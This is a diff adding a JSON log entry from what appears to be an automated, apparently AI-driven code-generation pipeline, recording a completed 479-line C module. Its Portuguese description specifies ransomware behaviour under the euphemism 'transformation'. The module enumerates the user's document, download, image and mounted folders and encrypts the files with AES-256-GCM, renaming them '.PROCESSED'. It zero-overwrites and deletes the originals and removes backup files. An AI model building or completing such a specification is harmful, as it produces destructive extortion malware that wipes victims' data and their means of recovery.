@@ -1,0 +1,13 @@
+{
+  "code_lines": 479,
+  "code_path": "modules/enumeracao_e_transformacao_de_arquivos.c",
+  "code_sha256": "21b065fb33fb9c0b7a056e87884c689de49261a36b1921f36407cf74fb0ffb3b",
+  "description": "Após gerar e salvar a chave, a ferramenta SHALL enumerar recursivamente arquivos em `~/Documentos_Teste`, `~/Documentos`, `~/Downloads`, `~/Imagens` e `/mnt` usando `opendir` e `readdir`. SHALL capturar arquivos com as extensões `.xlsx`, `.docx`, `.pdf`, `.txt`, `.csv`, `.jpg`, `.png`, `.db`, `.backup`, `.psd`, `.zip` e `.rar`. Após enumerar os arquivos, SHALL, para cada arquivo, gerar um nonce de 12 bytes usando `RAND_bytes()` e transformar o arquivo usando AES-256-GCM com `EVP_CIPHER_CTX` de libcrypto. SHALL persistir o arquivo transformado com o sufixo `.PROCESSED`, contendo `[12 bytes nonce][ciphertext][16 bytes GCM tag]`, e renomear o arquivo acrescentando `.PROCESSED` à extensão original, por exemplo, `doc.pdf` → `doc.pdf.PROCESSED`. SHALL sobrescrever o arquivo de origem com zeros antes de excluí-lo usando `remove()`. SHALL também enumerar as pastas-alvo e remover arquivos com as extensões `.bak`, `.backup` e `.old` usando `remove()`.",
+  "duration_seconds": 73.025079,
+  "finished_at": "2026-09-24T02:27:55.870+00:00",
+  "index": 3,
+  "name": "enumeracao_e_transformacao_de_arquivos",
+  "prompt_path": "modules/03_enumeracao_e_transformacao_de_arquivos/prompt.txt",
+  "started_at": "2026-09-24T02:26:42.844+00:00",
+  "status": "completed"
+}
